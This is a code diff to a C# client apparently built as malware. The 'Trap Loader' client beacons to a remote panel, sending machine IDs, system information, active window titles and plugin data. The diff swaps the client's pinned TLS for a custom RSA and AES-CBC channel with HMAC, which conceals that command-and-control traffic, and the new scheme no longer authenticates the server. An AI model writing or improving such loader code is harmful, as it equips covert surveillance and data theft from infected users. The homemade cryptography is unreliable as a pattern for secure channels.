@@ -59,6 +59,7 @@ public class TrapLoaderClient
     private static readonly object _writeLock = new object();
     private static readonly ConcurrentQueue<TcpMessage> _incomingMessages = new ConcurrentQueue<TcpMessage>();
     private static readonly ManualResetEventSlim _messageReady = new ManualResetEventSlim(false);
+    private static byte[] _aesKey;
 
     // Cached machine ID
     private static string _cachedMachineId = null;
@@ -550,7 +551,7 @@ public class TrapLoaderClient
         Log("========================================");
         Log(" Trap Loader Client (TLS)");
         Log(" Server  : " + sHost + ":" + sPort);
-        Log(" Crypto  : TLS 1.2");
+        Log(" Crypto  : AES-256-CBC + HMAC-SHA256");
         Log("========================================");
 
         int reconnectCount = 0;
@@ -596,30 +597,48 @@ public class TrapLoaderClient
                     continue;
                 }
 
-                Log("TCP connected! Establishing TLS...");
+                Log("TCP connected! Performing key exchange...");
 
-                var certBytes = Convert.FromBase64String(serverCertBase64);
-                var serverCert = new X509Certificate2(certBytes);
-                var ssl = new SslStream(tcpClient.GetStream(), false,
-                    (sender, certificate, chain, errors) =>
-                    {
-                        return certificate?.GetCertHashString() == serverCert.GetCertHashString();
-                    });
-                ssl.AuthenticateAsClient("Trap-Panel Server",
-                    null,
-                    SslProtocols.Tls12,
-                    false);
-                stream = ssl;
-                Log("TLS established!");
+                var netStream = tcpClient.GetStream();
+                byte[] keyLenBuf = new byte[4];
+                ReadExactRaw(netStream, keyLenBuf, 0, 4);
+                int serverKeyLen = keyLenBuf[0] | (keyLenBuf[1] << 8) | (keyLenBuf[2] << 16) | (keyLenBuf[3] << 24);
+                byte[] serverRsaPubKey = new byte[serverKeyLen];
+                ReadExactRaw(netStream, serverRsaPubKey, 0, serverKeyLen);
+
+                Log("Received server public key (" + serverKeyLen + " bytes).");
+
+                byte[] aesKey = new byte[32];
+                using (var rng = RandomNumberGenerator.Create())
+                    rng.GetBytes(aesKey);
+
+                byte[] encAesKey;
+                using (var rsaEncrypt = new RSACryptoServiceProvider())
+                {
+                    rsaEncrypt.ImportCspBlob(serverRsaPubKey);
+                    encAesKey = rsaEncrypt.Encrypt(aesKey, false);
+                }
+                byte[] encKeyLen = new byte[4];
+                encKeyLen[0] = (byte)(encAesKey.Length & 0xFF);
+                encKeyLen[1] = (byte)((encAesKey.Length >> 8) & 0xFF);
+                encKeyLen[2] = (byte)((encAesKey.Length >> 16) & 0xFF);
+                encKeyLen[3] = (byte)((encAesKey.Length >> 24) & 0xFF);
+                netStream.Write(encKeyLen, 0, 4);
+                netStream.Write(encAesKey, 0, encAesKey.Length);
+                netStream.Flush();
+
+                stream = netStream;
+                _aesKey = aesKey;
+                Log("AES key exchange complete! Channel encrypted.");
 
                 try { systemInfo = GetSystemInfo(); }
                 catch { }
 
                 string authJsonStr = BuildAuthJson(machineId, systemInfo);
                 byte[] authPayload = Encoding.UTF8.GetBytes(authJsonStr);
-                WriteTcpMessage(stream, MSG_AUTH, authPayload);
+                WriteEncryptedMessage(stream, MSG_AUTH, authPayload, aesKey);
 
-                var authResp = ReadTcpMessage(stream);
+                var authResp = ReadEncryptedMessage(stream, aesKey);
                 if (authResp == null)
                 {
                     Log("No auth response received");
@@ -685,7 +704,7 @@ public class TrapLoaderClient
         {
             while (_connectionAlive)
             {
-                var msg = ReadTcpMessage(stream);
+                var msg = ReadEncryptedMessage(stream, _aesKey);
                 if (msg == null)
                 {
                     _connectionAlive = false;
@@ -790,7 +809,7 @@ public class TrapLoaderClient
                 {
                     lock (_writeLock)
                     {
-                        WriteTcpMessage(stream, MSG_HEARTBEAT, new byte[] { 0 });
+                        WriteEncryptedMessage(stream, MSG_HEARTBEAT, new byte[] { 0 }, _aesKey);
                     }
                     lastHeartbeat = now;
                 }
@@ -810,7 +829,7 @@ public class TrapLoaderClient
                     byte[] infoBytes = Encoding.UTF8.GetBytes(systemInfo);
                     lock (_writeLock)
                     {
-                        WriteTcpMessage(stream, MSG_CLIENT_INFO, infoBytes);
+                        WriteEncryptedMessage(stream, MSG_CLIENT_INFO, infoBytes, _aesKey);
                     }
                 }
                 catch (Exception ex)
@@ -830,7 +849,7 @@ public class TrapLoaderClient
                         byte[] titleBytes = Encoding.UTF8.GetBytes(title);
                         lock (_writeLock)
                         {
-                            WriteTcpMessage(stream, MSG_ACTIVE_WINDOW, titleBytes);
+                            WriteEncryptedMessage(stream, MSG_ACTIVE_WINDOW, titleBytes, _aesKey);
                         }
                     }
                 }
@@ -1612,20 +1631,81 @@ public class TrapLoaderClient
 
     // ==================== TCP Protocol ====================
 
-    private static void WriteTcpMessage(Stream stream, byte msgType, byte[] payload)
+    private static void ReadExactRaw(Stream stream, byte[] buffer, int offset, int count)
+    {
+        int totalRead = 0;
+        while (totalRead < count)
+        {
+            int read = stream.Read(buffer, offset + totalRead, count - totalRead);
+            if (read <= 0) throw new Exception("Connection closed during key exchange");
+            totalRead += read;
+        }
+    }
+
+    private static byte[] DeriveHmacKey(byte[] aesKey)
+    {
+        using (var sha = SHA256.Create())
+            return sha.ComputeHash(Encoding.UTF8.GetBytes("HMAC-" + BytesToHex(aesKey)));
+    }
+
+    private static string BytesToHex(byte[] bytes)
+    {
+        var sb = new StringBuilder(bytes.Length * 2);
+        foreach (byte b in bytes)
+            sb.Append(b.ToString("x2"));
+        return sb.ToString();
+    }
+
+    private static bool ConstantTimeEquals(byte[] a, byte[] b)
+    {
+        if (a.Length != b.Length) return false;
+        int diff = 0;
+        for (int i = 0; i < a.Length; i++)
+            diff |= a[i] ^ b[i];
+        return diff == 0;
+    }
+
+    private static void WriteEncryptedMessage(Stream stream, byte msgType, byte[] payload, byte[] aesKey)
     {
         int payloadLen = payload != null ? payload.Length : 0;
-        int totalLen = 1 + payloadLen;
+        int plaintextLen = 1 + payloadLen;
+        byte[] plaintext = new byte[plaintextLen];
+        plaintext[0] = msgType;
+        if (payloadLen > 0)
+            Buffer.BlockCopy(payload, 0, plaintext, 1, payloadLen);
 
-        byte[] packet = new byte[4 + totalLen];
+        byte[] iv = new byte[16];
+        using (var rng = RandomNumberGenerator.Create())
+            rng.GetBytes(iv);
+
+        byte[] ciphertext;
+        using (var aes = Aes.Create())
+        {
+            aes.Key = aesKey;
+            aes.IV = iv;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            using (var enc = aes.CreateEncryptor())
+                ciphertext = enc.TransformFinalBlock(plaintext, 0, plaintextLen);
+        }
+
+        byte[] ivCipher = new byte[16 + ciphertext.Length];
+        Buffer.BlockCopy(iv, 0, ivCipher, 0, 16);
+        Buffer.BlockCopy(ciphertext, 0, ivCipher, 16, ciphertext.Length);
+
+        byte[] hmacKey = DeriveHmacKey(aesKey);
+        byte[] hmac;
+        using (var h = new HMACSHA256(hmacKey))
+            hmac = h.ComputeHash(ivCipher);
+
+        byte[] packet = new byte[4 + ivCipher.Length + 32];
+        int totalLen = ivCipher.Length + 32;
         packet[0] = (byte)(totalLen & 0xFF);
         packet[1] = (byte)((totalLen >> 8) & 0xFF);
         packet[2] = (byte)((totalLen >> 16) & 0xFF);
         packet[3] = (byte)((totalLen >> 24) & 0xFF);
-        packet[4] = msgType;
-
-        if (payload != null && payload.Length > 0)
-            Buffer.BlockCopy(payload, 0, packet, 5, payload.Length);
+        Buffer.BlockCopy(ivCipher, 0, packet, 4, ivCipher.Length);
+        Buffer.BlockCopy(hmac, 0, packet, 4 + ivCipher.Length, 32);
 
         stream.Write(packet, 0, packet.Length);
         stream.Flush();
@@ -1635,14 +1715,12 @@ public class TrapLoaderClient
     {
         byte[] buffer = new byte[count];
         int totalRead = 0;
-
         while (totalRead < count)
         {
             int read = stream.Read(buffer, totalRead, count - totalRead);
             if (read <= 0) return null;
             totalRead += read;
         }
-
         return buffer;
     }
 
@@ -1652,29 +1730,65 @@ public class TrapLoaderClient
         public byte[] Payload { get; set; }
     }
 
-    private static TcpMessage ReadTcpMessage(Stream stream)
+    private static TcpMessage ReadEncryptedMessage(Stream stream, byte[] aesKey)
     {
         byte[] lenBuf = ReadTcpExact(stream, 4);
         if (lenBuf == null) return null;
 
         int totalLen = lenBuf[0] | (lenBuf[1] << 8) | (lenBuf[2] << 16) | (lenBuf[3] << 24);
-
-        if (totalLen <= 0 || totalLen > MaxMessageSize)
+        if (totalLen <= 32 || totalLen > MaxMessageSize + 16 + 32)
         {
             Log("Invalid message length: " + totalLen);
             return null;
         }
 
-        byte[] msgBuf = ReadTcpExact(stream, totalLen);
-        if (msgBuf == null) return null;
+        byte[] data = ReadTcpExact(stream, totalLen);
+        if (data == null) return null;
 
-        byte msgType = msgBuf[0];
-        byte[] payload = null;
+        byte[] ivCipher = new byte[totalLen - 32];
+        byte[] receivedHmac = new byte[32];
+        Buffer.BlockCopy(data, 0, ivCipher, 0, ivCipher.Length);
+        Buffer.BlockCopy(data, ivCipher.Length, receivedHmac, 0, 32);
 
-        if (totalLen > 1)
+        byte[] hmacKey = DeriveHmacKey(aesKey);
+        byte[] computedHmac;
+        using (var h = new HMACSHA256(hmacKey))
+            computedHmac = h.ComputeHash(ivCipher);
+
+        if (!ConstantTimeEquals(computedHmac, receivedHmac))
         {
-            payload = new byte[totalLen - 1];
-            Buffer.BlockCopy(msgBuf, 1, payload, 0, totalLen - 1);
+            Log("HMAC verification failed!");
+            return null;
+        }
+
+        if (ivCipher.Length < 16)
+            return null;
+
+        byte[] iv = new byte[16];
+        byte[] ciphertext = new byte[ivCipher.Length - 16];
+        Buffer.BlockCopy(ivCipher, 0, iv, 0, 16);
+        Buffer.BlockCopy(ivCipher, 16, ciphertext, 0, ciphertext.Length);
+
+        byte[] plaintext;
+        using (var aes = Aes.Create())
+        {
+            aes.Key = aesKey;
+            aes.IV = iv;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            using (var dec = aes.CreateDecryptor())
+                plaintext = dec.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
+        }
+
+        if (plaintext.Length < 1)
+            return null;
+
+        byte msgType = plaintext[0];
+        byte[] payload = null;
+        if (plaintext.Length > 1)
+        {
+            payload = new byte[plaintext.Length - 1];
+            Buffer.BlockCopy(plaintext, 1, payload, 0, payload.Length);
         }
 
         return new TcpMessage { Type = msgType, Payload = payload };
@@ -2045,7 +2159,7 @@ public class TrapLoaderClient
 
                 lock (_writeLock)
                 {
-                    WriteTcpMessage(stream, MSG_PLUGIN_DATA, payload);
+                    WriteEncryptedMessage(stream, MSG_PLUGIN_DATA, payload, _aesKey);
                 }
                 sent++;
                 anySent = true;
